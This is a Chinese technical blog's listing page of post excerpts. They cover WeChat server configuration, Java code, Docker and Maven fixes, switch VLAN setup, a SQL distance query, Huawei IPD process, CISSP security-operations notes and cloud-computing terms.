记得设置白名单，怎么看白名单？叫运维去搞，你本地测试的话，就直接回调，他会说某某地址不在白名单，然后你把自己的地址填进去，多试几次就好了。
配置完之后有个坑，最后面说
需要注意的是开启了服务器配置之后，基本上所有的微信公众号自带的功能你都不能用了，比如菜单栏。如果你开启了，然后关闭了，会在24H内才会好，中间别人使用公众号的功能就说是服务故障，很难办
经过讨论，如果以后运营不在微信自己的后台，而是要通过我们来调微信的接口，而且他们可能也不适应我们的新编辑器之类的东西，这是个很大的工作量，所以目前考虑的是使用第三方来委托，哪个便宜用哪个。
大部分的应该都可以，但是用之前要问清楚
可参考https://www.processon.com/login?f=index
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/749d1a2b921337f04e7957b630104c87/" rel="bookmark">
			响应码设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 package entity; /** * @program: * @description: **/ public class StatusCode { public static final Integer OK = 20000; public static final Integer ERROR = 20001; } public enum ResultCode { SUCCESS("0", "成功"), ERROR("-1", "系统异常"), PARAM_ERROR("1001", "参数异常"), USER_EXIST_ERROR("2001", "用户已存在"), USER_ACCOUNT_ERROR("2002", "账号或密码错误"), USER_NOT_EXIST_ERROR("2003", "未找到用户"), ORDER_PAY_ERROR("3001", "库存不足，下单失败"), PARAM_LOST_ERROR("2004", "参数缺失"), PARAM_PASSWORD_ERROR("2005", "原密码输入错误"), ; public String code; public String msg; ResultCode(String code, String msg) { this.code = code; this.msg = msg; } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8da2097585cbc39172efe00956fb43a/" rel="bookmark">
			Docker容器启动失败修改内部配置文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天因为项目测试，需要起多个Elastic Search，结果创建的容器每次启动后几秒钟就会停止。
之后使用命令docker log -f --tail=300 es1查看日志发现
the default discovery settings are unsuitable for production use; at least one of[discovery.seed_hosts,discovery.seed_providers,cluster.initial_master_nodes]must be configured
日志里提示的内容是默认配置不适合使用，需要提供中括号里的几个参数。
但是容器无法启动，这样就致使无法进入内部进行操作。此时想到了docker cp命令。
docker cp [容器]:容器path 主机path
这样的话就可以把容器中的配置文件复制到主机的指定位置，修改完成后
docker cp 主机path [容器]:容器path
紧接着反着再来一次，就复制到容器中了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0173437c0b0b30f198600c085c2449c4/" rel="bookmark">
			【有丝分裂检测】MIDOG Domain Adaptation实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景介绍部分参考这一篇博文:【01】有丝分裂检测—病理领域适应问题—论文解析1_TianleiShi的博客-CSDN博客
原文Github链接：https://github.com/scjjb/MIDOG_Domain_Adaptation
修改后的代码链接：
一. MIDOG预处理 解析MIDOG的标注文件.json → df = get_bbox_df()训练集和测试集划分 → train_test_split(df)图像块生成：不重叠裁剪成512*512尺寸的patch → mask_segmentor() from PatchSeg_functions import mask_segmentor from Data_functions import get_bbox_df, train_test_split ############ Preparation ################ ## Get dataset and generate 512x512 crops from the original WSIs df = get_bbox_df() df_train, df_test = train_test_split(df) image_ids=list(df['file_name'].unique()) mask_segmentor(image_ids,df,512,512,categories=['mitotic figure'], image_folder="I:/Pathology/Dataset/MIDOG2021/image_crops/") 1. json文件解析 主要是两个列表元素：images和annotationsimages列表中包含200张图像信息：file_name，id，width和heightannotation中包含了4435个标注信息：bbox坐标，category_id，image_id，id（第几个标注） 最终得到df，shape = {tuple: 2}(4435, 8)，如下图所示 2. 训练集和测试集划分 A、B、C三个中心分别有50张图片，每个中心以8：2的比例划分训练集和测试集【前40个为训练集，后10个为测试集】分别训练三个模型，并在另外1个中心进行外部测试。eg：A+B训练，C外部测试只对外部测试集进行校正，参与模型训练的数据集不进行颜色校正 二. 颜色校正 三. 细胞检测 1. U-Net分割网络实现过程 step1：依赖库导入，模型设置 💡 segmentation_models_pytorch 高级API：①集成了9种分割模型架构：Unet、Unet++、MAnet、Linknet、FPN、PSPNet、PAN、DeepLabV3、DeepLabV3+；②每种架构有113种可用的编码器；③所有编码器均具有预训练的权重，可更快收敛。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0173437c0b0b30f198600c085c2449c4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d937c9d79a97105307eb700abe0b955/" rel="bookmark">
			（1.5万字图文）解读华为集成产品开发IPD之市场管理流程（MM流程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通告：第一本全方位阐述华为端到端战略管理体系的著作《华为战略管理法：DSTE实战体系》出版了！！ 购买链接 1、当当网-《华为战略管理法：DSTE实战体系》购买链接
2、京东自营-《华为战略管理法：DSTE实战体系》购买链接
（1.5万字图文）解读华为集成产品开发IPD之市场管理流程（MM流程）
本文作者 | 谢宁，《华为战略管理法：DSTE实战体系》、《智慧研发管理》作者
本文字数约1.5万字，阅读约需30分钟
——————————————————
在谢宁老师分享华为集成产品开发IPD体系详细介绍（请点击链接华为集成产品开发管理IPD体系详细介绍-超级干货PPT图文！）之后，有粉丝留言希望可以针对IPD的一些关键管理模块进行更详细的介绍。本文特地针对集成产品开发IPD的市场管理（MM）体系进行详细解读。
读者如需获取《向华为学习 集成产品开发IPD》（谢宁老师 华为大学演讲版）材料（共120多页），请按照下面方式操作：在朋友圈转发本文（勿删除），并在本文中留言评论和关注本公众号。
获取方式：添加并私信微信DSTEIPD（见下图）：已转发文章，获取《向华为学习 集成产品开发IPD》（谢宁老师 华为大学演讲版）材料（共120多页）。
零、市场管理（MM）流程的概述 市场管理流程，华为内部称为“MM流程”（Market Management，MM）。
华为市场管理是通过对市场和细分市场的分析，制定细分市场的策略，形成商业计划，把商业计划落实在日常工作当中。
市场管理流程的目的是保证工作方向的正确性。市场管理流程输出的商业计划包括3~5年的战略计划SP和未来一年的年度商业计划BP，是华为公司产品管理团队工作的基础。《华为战略管理法：DSTE实战体系》作者谢宁老师认为，市场管理流程（MM流程）如何和产品路标规划、技术路标规划等流程打通融合，需要另外撰写专文阐述。
市场管理MM一共有六个步骤，从理解市场开始，到细分市场、组合分析、制定业务战略规划、融合和优化业务计划、管理业务计划并评估绩效。
第一步理解市场：设定愿景、使命，确定目标或潜在的机会目标，这里的愿景使命，是产品线的愿景使命，是业务层面的愿景使命，目标也分为现有业务的目标，和潜在机会业务的目标。
第二步市场细分：从客户出发，找到可以细分客户的维度，对市场（客户）进行细分，进而对细分市场进行筛选，初步确定目标细分市场。
第三步组合分析：MM中的说法是选择投资机会并排序，实际上是对目标细分市场进行排序，从市场的增长性、潜在空间、盈利性、可进入性进行评估，结合SPAN工具来说，考察竞争力和吸引力两个层面即可。
对机会点进行分析后，开始审视各市场机会的战略定位，对其做竞争分析，对其做财务分析（业绩分析），审视差距分析，最终确定业务设计。
第四步制定业务战略规划：业务战略规划包括四小步，收集并评估前面步骤的分析结论（宏观分析、客户分析、竞争分析、SWOT分析、安索夫矩阵分析、SPAN分析），制定简要的战略目标，明确细分市场的价值定位（价值主张），明确业务行动计划。
第五步融合与优化业务计划：整合、调整并优化所有的业务计划，制定出合理的投资组合，并根据优化的组合来制定预算，并对业务计划作出承诺，确保业务计划与其他部门的协调配合。
第六步管理业务计划并评估绩效：对业务计划进行管理，制定任务书，并对业务计划进行管理，对执行结果进行评估，需要时对业务计划进行刷新。
在这里，《华为战略管理法：DSTE实战体系》作者谢宁老师提出一个问题供大家思考和交流：MM和VDBD、BLM、DSTE等方法论有什么区别和联系呢？
一、市场管理MM第一步：理解市场 市场管理MM第一步理解市场对市场进行概要描述，包括了解和评估市场的经济、行业（信息技术行业详情）、竞争对手、客户和产品线机会。目的是促进产品线管理团队/规划团队加强对自己所运作的环境的了解，并对该环境进行明确描述。这有助于产品线细分市场并进行优先排序。
MM作为一个市场管理方面的流程，是流程就会存在输入输出。理解市场的输入是业务方向、客户需求、竞争格局、原有业务组合与计划，理解市场的输出有两个重要的交付件，一个是业务（产品线）使命与目标，另一个是市场评估报告。
1、理解市场的输入
业务方向－产品线高层（PL-IPMT：产品线集成组合管理团队）应给予团队整体业务方向的指导。
客户需要和需求－因为市场管理流程重点关注于市场驱动的市场规划，未来1到3年的概括性客户需要和需求是整个流程的驱动器。
市场和竞争信息－团队需要收集所有与产品线有关的信息（市场趋势、竞争对手和客户行动、环境变化等），来进行市场评估。
产品线当前的业务计划和组合－将以前有关产品线业务方向和计划的所有工作和交付件作为市场管理流程的切入点。
2、定义使命与目标
使命和目标是产品线在今后几年应遵循的大致方向。使命和目标也提供了制定业务计划所依托的架构。
使命描述是对目标的持久的描述，从产品、市场和服务方面生动体现产品线目前和将来的业务活动。重要的是要注意到使命的描述并不只是为促销或树立形象，它是我们市场驱动的市场管理流程的基础。
①使命的来源与思考
产品线的使命不同于对整个集团/公司组织的使命描述，产品线的使命要比集团使命更加具体。我们也可以使命本身来看待事业部的使命定义，即从产品、市场、服务的角度、生动地描述事业部当前和未来业务活动的愿景、使命。
②使命的描述要素
使命的描述要素共有5个，第一个是产品线角色和对公司的贡献，第二个是业务描述（满足客户需求和提供好处），第三个是差异化能力，第四个是利润模型和战略控制；第五个是未来指示标（优先级，待定）。
使命的描述应该能够振奋人心并具有挑战性，但又是切合实际的，要避免毫无特点的笼统声明和模糊不清的愿景描述。
产品线角色和对公司的贡献－多数情况下产品线认为自己是利润生成者（对此进行具体定义），也可能是机会寻找人/促成人，和通过关键产品市场价值，公司其它部分可以利用的贡献者。
业务描述（附加价值－满足客户需求或提供好处）－主要关注于产品线直接回应他们的优先业务需求时所带给客户的益处。应关注于目前使产品线成功的价值（已被客户认可并购买的），并列出你需要在规划阶段创造的新价值。不要忘记考虑市场趋势和业务环境。竞争对手和竞争性将在下一个要素中进行考虑。
差异化能力－目前为止，这些是加固成功的主要技能/能力/资源。对能力的验证必须给客户带来实际价值，并通过竞争交付出重要的可持续优势。将产品线之外但公司所承诺的价值链要素包括进来是允许的。底线：团队通常会列出2到4条原因，描述为什么客户选择公司的产品而不选择竞争对手的产品。
利润模型和战略控制－团队可以把以可盈利性形式（或其他备选财务方法）获取的当前价值与竞争差异和“战略控制点”关联起来。这应当从当前业务的角度，在未来变化多端的竞争环境的上下文中进行展示。
未来指示标（优先级）－团队应当预测产品线的主要优先级，并简要指出一直没什么吸引力的领域。虽然这项使命看起来没太大意思，但也应尽力去做，因为它非常有挑战性。
③使命声明工作表
输出产品线使命、愿景和战略。
产品线的使命回答产品线存在的理由，为客户、股东、员工有哪些贡献；产品线的愿景和战略，需要界定清楚业务范围，明确产品线的市场地位，以及盈利模式和战略控制点。
产品线的愿景/战略，重在回答从事什么业务，想成为什么样子，通过什么样的方式，其中想成什么样子是愿景（可以通过业界地位来描述）、通过什么方式（可以用业务设计来描述）。
如：产品线使命为电信级和企业级客户提供更方便、更高效的面对面的沟通方式；产品线愿景为5年内成为国内视频会议系统第一供应商，未来在全球市场做到数一数二。
④业务目标
业务目标是用来描述已达成共识的业务承诺、约束因素和期望。
时间维度上，我们可以选择3年或3-5年，当前环境下建议考虑3年即可。
常见的目标维度有财务目标、市场目标、产品技术目标、细分市场目标、组织目标和合作资源目标等。
其中，财务目标可以从销售数量、销售额、利润、回款等角度进行考虑；市场目标可以从市场占有率、市场地位等方面进行规划；产品与技术研发方面的目标，更多从研发费用率、研发队伍、专利数量等交付进行约束。
3、进行市场分析
市场分析的目的，便于IPMT角色了解市场环境，从而找到产品线的机会点。
①市场分析框架
市场分析应关注整个市场规模、市场增长和趋势，分析细分市场和需求，分析购买者行为，分析渠道网络，分析市场表现（产品、渠道、客户、沟通等）。
从这些要素里面，我们重点关注几个方面：环境分析、市场分析、竞争分析和自身分析。
②环境分析
环境分析也是对市场环境的概括描述。重要的是评估环境变化可能给产品线带来的影响。分析过程中只需要考虑那些对业务真正有意义的事件，尽管如此，除了显而易见的技术外，许多其他领域也可能有变更。主要应关注于以下领域：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d937c9d79a97105307eb700abe0b955/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec2ec5f730d1344a84f5b8123091b09f/" rel="bookmark">
			线程等待与唤醒
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
概念
等待方法 唤醒方法 唤醒和阻塞具体的使用 wait和sleep的区别
概念 在我们多线程开发的时候，有时候会有让一些线程先执行的，这些线程结束后，其他线程再继续执行，列如我们生活中打球，球场的每个人都是一个线程，那一个球员必须先传球给另一个球员，那么另一个球员才能投篮，这就是一个线程的一个动作执行完，另一个线程的动作才能执行线程间的等待与唤醒机制，wait和notify是Object的方法，用于线程的等待与唤醒，必须搭配着synchronized来使用，脱离 synchronized 使用 wait 会直接抛出异常 等待方法 痴汉方法，死等，线程进入阻塞态（WAITING）,直到有其他线程调用notify方法唤醒 等待一段时间，若再该时间内线程被唤醒，则继续执行，若超过了相应时间还没有其他线程唤醒此线程，此线程不再等待，恢复执行 等待方法做的事
调用wait方法的前提是获得这个对象的锁（synchronized对象锁，如果有多个线程取竞争这个锁，只有一个线程获得锁，其他线程会处于等待队列） 使当前执行代码的线程进行等待 . ( 把线程放到等待队列中 ) 调用wait方法会释放锁满足一定条件会重新尝试获得这个锁，被唤醒的之后不是立即恢复执行，而是进入阻塞队列，竞争锁 结束等待的三个方式
其他线程调用该对象的 notify 方法. wait 等待时间超时 (wait 方法提供一个带有 timeout 参数的版本, 来指定等待时间). 其他线程调用该等待线程的 interrupted 方法, 导致 wait 抛出 InterruptedException 异常 唤醒方法 notify()随机唤醒一个处在等待状态的线程 notifyAll()唤醒所有处在等待状态的线程方法notify()也要在同步方法或同步块中调用，该方法是用来通知那些可能等待该对象的对象锁的 其它线程，对其发出通知notify，并使它们重新获取该对象的对象锁。 如果有多个线程等待，则有线程调度器随机挑选出一个呈 wait 状态的线程。(并没有 "先来后到") 在notify()方法后，当前线程不会马上释放该对象锁，要等到执行notify()方法的线程将程序执行完，也就是退出同步代码块之后才会释放对象锁。 唤醒和阻塞具体的使用 package thread.wait_notify; public class waitDemo { private static class WaitTask implements Runnable{ private Object lock; public WaitTask(Object lock){ this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec2ec5f730d1344a84f5b8123091b09f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8db6f41c025dced02268ccea6f119f52/" rel="bookmark">
			根据经纬度计算两点之间的距离(sql计算)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 通过sql方式实现
select * from (SELECT id, store_code, store_name, IF((ISNULL(30.5729213673073) || LENGTH(trim(30.5729213673073)) &lt; 1 || ISNULL(baidu_latitude) || LENGTH(trim(baidu_latitude)) &lt; 1), 1000000, ROUND(6378.137 * 2 * ASIN(SQRT(POW( SIN((30.5729213673073 * PI() / 180 - baidu_latitude * PI() / 180) / 2), 2) + COS(30.5729213673073 * PI() / 180) * COS(baidu_latitude * PI() / 180) * POW( SIN((114.18290605662781 * PI() / 180 - baidu_longitude * PI() / 180) / 2), 2))), 2)) * 1000 AS metre FROM table.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8db6f41c025dced02268ccea6f119f52/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f230ea24aaa435484a1467584a5a4bde/" rel="bookmark">
			二层交换机实现不同vlan通信
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二层交换机实现不同vlan通信 实验拓扑
一、 第一种实现方式：
sw1:
vlan batch 10 20
interface GigabitEthernet0/0/1
port link-type access
port default vlan 10
interface GigabitEthernet0/0/2
port link-type trunk
port trunk pvid vlan 10 //默认为1，为了去标签改成10
port trunk allow-pass vlan 2 to 4094
sw2:
vlan batch 10 20
interface GigabitEthernet0/0/1
port link-type trunk
port trunk pvid vlan 20 //无标签打上20为了能够发到vlan20
port trunk allow-pass vlan 2 to 4094
interface GigabitEthernet0/0/2
port link-type trunk
port trunk pvid vlan 10 //无标签打上10为了能够发到vlan10
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f230ea24aaa435484a1467584a5a4bde/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f72662736167a3acd02efd4b4d73557c/" rel="bookmark">
			maven package之后没有生成target文件夹，也没有生成jar/war包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击package看控制台正常运行结束，然后发现项目中并没有出现jar/war包，也没有出现target目录，这时候你得看看pom文件中packaging标签中填的什么，
有三种填法。
pom：打出来可以作为其他项目的maven依赖，在工程A中添加工程B的pom，A就可以使用B中的类。用在父级工程或聚合工程中。用来做jar包的版本控制。既不会出现jar包也不会出现war包。
jar：打成jar包。
war：打成war包。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98608cedb50a78506c1d0c8319508e29/" rel="bookmark">
			【Cocos creator】Cocos creator介绍和入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、工作流程二、安装和启动三、入门示例四、项目结构五、编辑器界面 Cocos Creator 是一个完整的游戏开发解决方案，包含了 cocos2d-x 引擎的 JavaScript
实现，以及快速开发游戏所需求的各种图形界面东西。Cocos Creator
的编辑器完全为引擎定制打造，包含从规划、开发、预览、调试到发布的整个工作流所需的全功能，该编辑器供给面向规划和开发的两种工作流，供给简略顺畅的分工合作方法。Cocos
Creator 现在支持发布游戏到 Web、Android 和 iOS，真正实现一次开发，全渠道工作。Cocos Creator
是以内容创作为中心的游戏开发东西，在 Cocos2d-x 基础上实现了完全脚本化、组件化和数据驱动等特征。本文将详细介绍cocos
creator 入门常识 。
一、工作流程 cocos creator的流程如下所示 【创建或导入资源】
将图片、声音等资源拖拽到编辑器的资源管理器面板中，即可完结资源导入。
此外，也能够在编辑器中直接创建场景、预制、动画、脚本、粒子等各类资源。
【建造场景内容】
项目中有了一些根本资源后，就能够开端建立场景了，场景是游戏内容最根本的安排方法，也是向玩家展现游戏的根本形态。
经过场景编辑器将添加各类节点，担任展现游戏的美术音效资源，并作为后续交互功用的承载。
【添加组件脚本，完成交互功用】
可认为场景中的节点挂载各种内置组件和自定义脚本组件，来完成游戏逻辑的运转和交互，包括从最根本的动画播映、按钮响应，到驱动整个游戏逻辑的主循环脚本和玩家角色的控制。
几乎一切游戏逻辑功用都是经过挂载脚本到场景中的节点来完成的。
【一键预览和发布】
建立场景和开发功用的过程中，能够随时点击预览来检查当时场景的运转效果。使用手机扫描二维码，能够立即在手机上预览游戏。
当开发告一段落时，经过构建发布面板能够一键发布游戏到包括桌面、手机、Web 等多个平台。
二、安装和启动 【windows】
- 从 v1.3.0 开始，Windows 版 Cocos Creator 将不供给 32 位操作体系支撑，Windows 所支撑的最低版别是 Windows 7 64位。
Windows 版的装置程序是一个 .exe 可执行文件，一般命名会是 CocosCreator_vX.X.X_20XXXXXX_setup.exe，其间 vX.X.X 是 Cocos Creator 的版别号，如 v1.2.2，后面的一串数字是版别日期编号。
注意：日期编号在运用内测版时会更新的比较频频，假如当时 PC 上已装置的版别号和装置包的版别号相同时，无法主动覆盖装置注意相同版别号的装置包，需要先卸载之前的版别才能持续装置。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98608cedb50a78506c1d0c8319508e29/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/097e4833c1e9fb6a5615cc4c696f24f7/" rel="bookmark">
			当电脑出现无法访问 Gitlab 时，解决策略
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当出现无法访问 Gitlab 时，可能的原因就是电脑的DNS未配置正确，此时可根据以下步骤进入修改：
1、选取地址
点击 “网络和 Internet” --&gt;“网络和共享中心”--&gt;“以太网”--&gt;在以太网状态选择“属性”--&gt;在以太网属性中选择“Internet协议版本4（TCP/IPv4）”--&gt;选择“属性”，就可以查看到如下界面：
选择“使用下面的 DNS 服务器地址”，其中只需要填写“首选 DNS 服务器”即可，“备选 DNS 服务器”不用管。“首选 DNS 服务器”地址还可以选用如下的地址。
2、刷新 DNS 地址
1)Win键+R，运行中输入 cmd 并确定
命令提示符中输入：ipconfig /flushdns 回车 ，DNS则被刷新。
参考博客：
Windows如何修改DNS - 知乎
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7225fd702a4ee6262a0e3827048d10eb/" rel="bookmark">
			【CISSP备考】第七章-安全运营
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安全运营管理 应用安全运营概念 安全运营实践的主要目的是保护资产，包括信息、系统、设备和设施。
知其所需和最小特权 任何安全IT环境需要准许的两个标准原则分别是知其所需和最小特权原则。这两个原则通过限制对资产的访问来帮助保护有价值的资产
1、知其所需访问
知其所需原则强制要求授予用户仅访问执行工作所需数据或资源的权限，主要目的是让信息保持秘密状态。
2、最小特权原则：
最小特权原则规定，主体仅被授予完成工作所需的特权，而不再被授予更多特权。对于数据，是指写入、创建更改或者删除数据的能力，限制和控制这些特权可保护数据的保密性和完整性。
最小特权通常侧重于保证用户权限受到限制，但也适用于其他主体，例如应用程序或者进程。
实施知其所需和最小特权时原则时，员工需要考虑的附加概念有权利、聚合和信任传递
权利：权利是指授予用户权限的数量。通常在首次分配账户时指定，，即创建账户时，管理员会为账户设置合适数量的资源，其中包括权限。
聚合：在最小特权的上下文中，聚合是指用户随时间收集的权限数量。如，如果员工从一个部门调动到另一个部门时，那么如果不及时撤销原先的部门权限，则意味着这个员工将同时拥有两个部门的权限
信任传递：两个安全域之间的信任关系，允许一个域的主体访问另一个域的对象。信任传递可将信任关系传递到子域，在最小特权原则下检查这些信任关系很重要。
职责分离： 职责分离确保个体无法完全控制关键职能或者系统。确保没有任何一个人可以破坏系统或者安全，这种做法事必要的，相反，两人以上必须密谋或者串通才能危害组织，这会增加这些人暴露的风险。
职责分离策略形成一个制衡系统，其中两个或者多个用户验证彼此行为，并且必须协同完成必要的工作任务。职责分离策略有助于减少欺诈，因为它迫使两人或者多人之间串通来执行未授权的活动。
1、特权分离：
特权分离建立在最小特权原则的基础上，并将其应用到应用程序和流程，特权分离策略需要使用细化的权限。管理员应授予每个账户在应用程序中完成功能所需的权限，这种做法遵循了特权分类的策略。
2、任务分解
任务分解目标是确保个人未拥有过多的系统访问权限（进而可能引发利益冲突），当任务被适当分解时，没有任何一个员工可进行欺诈、犯错或者掩盖。
萨班斯-奥克斯利法案（SOX）特别强调任务分解策略，SOX适用于所有向美国证券交易委员会SEC注册了股票或者债务证券的上市公司。
任务分解策略最常见的实施方式是确保安全工作任务与组织内的其他工作任务分离。，如负责审计、监控和审查安全的人员没有承担与审计、监控和审查目标相关的运营工作任务。
任务分解控制矩阵
3、双人控制
双人制要求经过两个人批准后才能执行关键任务。在组织内使用双人控制可以实现同行评审，并且减少串通和欺诈的可能性。
知识分隔是将职责分离和双人控制的理解融入一个解决方案，基本思想是将执行操作所需的信息或者特权分配给两个或者跟多个用户
岗位轮换 岗位轮换可进一步控制和限制特权功能。岗位轮换作为一种安全控制措施，可实现同行评审，减少欺诈并且实现交叉培训，交叉培训可减少环境对任何个体的依赖。岗位轮换可同时起到威慑和检测的作用。
强制休假 这种做法提供一种同行评审形式，有助于发现欺诈和串通行为
特权账户管理 特权账户管理确保员工没有超出所需权限，并且不会滥用这些权限。
监控特权账户需要与其他基本原则结合起来，例如最小特权和职责分离
监视提升权限的使用还可检测到高级持续性威胁攻击活动，
管理信息生命周期 安全控制需要在整个生命周期内对信息进行保护。
生成或者捕获：数据可由用户、系统或者被捕获（例如用户从互联网下载文件并且流量通过边界防火墙时）
分类：最主要考虑的是确保敏感数据能够依据分类进行适当识别和处理。除了从外观上标记系统，组织还经常设置壁纸和评报程序，清晰的显示系统处理数据的级别。
存储：数据主要存储在磁盘上，员工应该定期备份有价值的数据。敏感数据也应该采用加密手段进行保护，敏感信息的备份保管在现场的一个位置，副本保管在场外的另一个位置，物理安全方法可以保护备份免遭盗窃，环境控制措施可以保护数据避免因环境污染而造成数据丢失
使用：使用指数据在网络中使用或者传输，
归档：数据有时需要归档、从而遵守要求数据保留的法律或者法规
销毁或清除：当数据不再需要时，应以不可恢复的方式进行销毁，
服务水平协议 SLA是组织与外部实体之间的协议，规定了性能预期，如果供应商无法满足这些预期，SLA通常包含处罚条款
mou谅解备忘录、互连安全协议ISA。
关注人员安全 1、胁迫
警卫可以使用胁迫系统发出警报、简单胁迫系统只有一个发送遇险呼叫的按钮，监控人员接收到遇险呼叫后，根据设定程序做出响应。安全系统通常包含暗语或者短语
2、出差
另一个安全关注是员工出差，由于犯罪分子可能在出差时对组织员工下手。培训员工在出差途中的安全实践、可提高其安全意识，预防安全事故。
电子设备的风险：
敏感数据、恶意软件和监控设备。
免费WiFi：在出差期间免费WiFi通常诱人，但是免费WiFi可以迅速设置成一个捕获所有用户流量的陷阱。
应急管理：
应急管理计划及实践帮助组织在灾难发生后处理人员安全问题
安全培训与意识
实施安全意识培训计划非常重要，帮助员工了解胁迫系统，出差最佳实践应急管理计划以及一般性安全和安保最佳实践。
安全配置资源 安全运营的另一个要素是在整个生命周期中配置和管理资源。
组织运用各种资源保护技术，保证资源可安全的配置和管理。例如台式计算机通常使用镜像技术进行部署，确保系统以已知的安全状态启动。变更管理和补丁管理技术保证系统依据所需变更进行更新，
管理硬件和软件资产 硬件指IT资源，如计算机，服务器，路由器，交换机以及外围设备。
1、硬件库存
在设备生命周期中使用数据库和库存应用程序来实施资产清查，并且跟踪硬件资产。例如条形码系统可以打印条形码，并且贴在硬件设备上。员工定期使用条形码阅读器扫描所有条形码，验证组织是否仍然掌控着这些硬件。
当设备使用寿命结束时，员工很容易忽视其存储的数据，因此使用检查表来清理系统通常非常有用，检查表包含对系统内各类介质的净化步骤，净化对象包括系统内置硬盘，非易失性存储器，以及CD、DVD和USB闪存驱动器等可移动介质。
2、软件许可
组织会支付软件费用，并且通常使用许可秘钥来激活软件。激活过程往往需要通过互联网连接许可服务器，防止使用盗版软件。如果许可秘钥泄漏到外部，可能导致组织内使用的许可秘钥失效，监测软件许可合规来边法律纠纷问题。
软件许可还指确保系统不安装未经授权的软件，许多工具可以远程检查系统，检测系统详情，例如，微软SCCM是一种可以查询到网络上所有系统的服务器产品。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7225fd702a4ee6262a0e3827048d10eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ebe36a7b3860246ee3ce710d32bae1d/" rel="bookmark">
			浅谈原型链与原型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f1ecbceefd12dd704f604b755e8f240/" rel="bookmark">
			浅析云计算领域的专业名词
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		浅谈云计算领域中涉及专业名词的基本概念 ① DevOps② 云服务器③ 容器技术3.1 进程和线程3.2 容器3.3 Docker 容器3.4 Kubernetes 容器云3.5 Docker 和 K8S 的渊源【转载】 ④ 微服务⑤ 软件开发流⑥ 产品经理黑话 Reference（参考） ① DevOps 什么是 DevOps？
DevOps 全称是：Development and Operations，即开发和运营。是一套实践、工具和文化理念，可以实现软件开发团队和 IT 团队之间的流程自动化和集成，说白了，就是一种体系，这套体系开发、测试、运维、安全等全部与项目相关的人员都包含在其中，大家相互反馈，提升开发效率
DevOps 生命周期
DevOps 生命周期由六个阶段组成（如上图所示），左半部分代表开发，右边部分代表运营。分别是 PLAN（规划）、BUILD（构建）、CI / CD（持续集成和交付）、MONITOR（监控和警报）、OPERATE（运维）、CONTINUOUS FEEDBACK（持续反馈）
DevOps – 自动化流程
因为这部分直接讲空话很难理解，所以我就以自己所在公司的项目自动化流程为例。
首先项目由领导提出，然后由产品经理构思和提出各种方案，然后在 KAE 平台（PaaS 的一种，此处可以理解成工作平台）上发布各个阶段开发需要完成的任务，然后开发每完成一个阶段的任务，先部署在测试环境，由测试人员进行测试，此时测试可以分为手工测试和自动化测试，前者是黑盒测试，在项目页面或移动端测试开发的全部功能（手动点点点），后者是白盒测试，使用自动化工具在不同环境中测试每一个接口（又分为接口测试和性能测试），并将测试出的 BUG 反馈至 KAE 平台。此阶段一般持续三轮，分别在 gama、beta、alpha 环境（内部环境、测试环境、预发布环境）都通过后，经产品经理确认后，部署至正式环境中，接着又到新一轮循环了。
可以看到这整个自动化流程，开发、测试、产品经理都有参与的，虽然我没见过运维，但我认为运维的职责应该是管理着整个 KAE 平台，等平台服务器出问题时就会出马了。
补充一下：我司的开发只分为前端和后端，项目的代码部署在 Gitlab 上，仅开发人员能上传和修改，但是测试人员可以看到其中的报错日志；测试不仅有接口测试和性能测试，还有安全测试，包含传统的 SQL 注入、XSS、SSRF 等，这些都是自动化的，既每天定时在测试环境跑一次，有报错就会反馈。
DevOps – 可观察性
